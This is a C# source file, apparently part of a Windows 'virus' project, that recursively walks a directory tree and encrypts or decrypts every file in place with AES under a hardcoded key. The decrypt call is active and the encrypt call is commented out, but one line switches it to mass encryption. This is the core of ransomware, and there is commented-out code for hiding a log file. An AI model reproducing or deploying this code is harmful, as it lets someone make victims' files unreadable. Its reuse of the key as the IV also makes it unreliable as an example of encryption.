using System;
using System.IO;
using System.Reflection;
using System.Collections.Generic;
using System.Text;
using System.Security.Cryptography;
//Use this for Encryp or Decryp file
namespace VirusWinForm
{
    public class Crypto
    {
        public class Encrypt
        {
            public static bool EncryptFile(string sDestinationFilePath, string skey)
            {
                try
                {
                    using (RijndaelManaged aes = new RijndaelManaged())
                    {
                        byte[] key = ASCIIEncoding.UTF8.GetBytes(skey);

                        /* This is for demostrating purposes only.
                         * Ideally you will want the IV key to be different from your key and you should always generate a new one for each encryption in other to achieve maximum security*/
                        byte[] IV = ASCIIEncoding.UTF8.GetBytes(skey);

                        // read all bytes form file 
                        byte[] bPlainData = File.ReadAllBytes(sDestinationFilePath);
                        using (FileStream fsCrypt = new FileStream(sDestinationFilePath, FileMode.Create))
                        {
                            using (ICryptoTransform encryptor = aes.CreateEncryptor(key, IV))
                            {
                                using (CryptoStream cs = new CryptoStream(fsCrypt, encryptor, CryptoStreamMode.Write))
                                {
                                    foreach (byte b in bPlainData)
                                        cs.WriteByte(b);
                                }
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("ERROR MESSAGES: \n" + ex.Message);
                    return false;
                    // failed to encrypt file
                }
                return true;
            }
        }

        public static class Decrypt
        {
            public static bool DecryptFile(string destinationFilePath, string skey)
            {
                try
                {
                    using (RijndaelManaged aes = new RijndaelManaged())
                    {
                        byte[] key = ASCIIEncoding.UTF8.GetBytes(skey);

                        /* This is for demostrating purposes only.
                         * Ideally you will want the IV key to be different from your key and you should always generate a new one for each encryption in other to achieve maximum security*/
                        byte[] IV = ASCIIEncoding.UTF8.GetBytes(skey);

                        byte[] temp;
                        using (FileStream fsEncrypted = new FileStream(destinationFilePath, FileMode.Open))
                        {
                            temp = new byte[fsEncrypted.Length];
                            using (ICryptoTransform decrypt = aes.CreateDecryptor(key, IV))
                            {
                                using (CryptoStream cs = new CryptoStream(fsEncrypted, decrypt, CryptoStreamMode.Read))
                                {
                                    int data, i = 0;
                                    while ((data = cs.ReadByte()) != -1)
                                    {
                                        temp[i++] = (byte)data;
                                    }
                                }
                            }
                        }
                        File.WriteAllBytes(destinationFilePath, temp);
                    }

                }
                catch (Exception ex)
                {
                    // failed to decrypt file
                    Console.WriteLine("Error" + ex.Message);
                    return false;

                }
                return true;
            }
        }

    }
    class ScanFileAndCrypt
    {

        public void DirectorySearch(string dir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(dir))
                {
                    Console.WriteLine(Path.GetFileName(f));
                    writer(f);
                }
                foreach (string d in Directory.GetDirectories(dir))
                {
                    //                    Console.WriteLine(Path.GetFileName(d));
                    writer(d);
                    DirectorySearch(d);
                }
            }
            catch (Exception ex)
            {
                //                Console.WriteLine(ex.Message);
                writer(ex.Message);
            }
        }
        public void writer(String cnt)
        {
            // Check if it is files, encrypt is
            try
            {
                FileInfo mFileInfo = new FileInfo(cnt);
                if (mFileInfo.Attributes != FileAttributes.Directory)
                {
                    Console.WriteLine(cnt);
                   // Crypto.Encrypt.EncryptFile(cnt, "tuduyconheo20190");

                    Crypto.Decrypt.DecryptFile(cnt, "tuduyconheo20190");

                }

            }
            catch (Exception ex)
            {
                Console.WriteLine("ERROR\n" + ex.Message);

            }

            //if (!hidden)
            //{
            //    // After delete file if have then create new and hidden it
            //    File.SetAttributes(logTreeFile, File.GetAttributes(logTreeFile) | FileAttributes.Hidden);
            //    hidden = true;
            //}
        }
    }
}



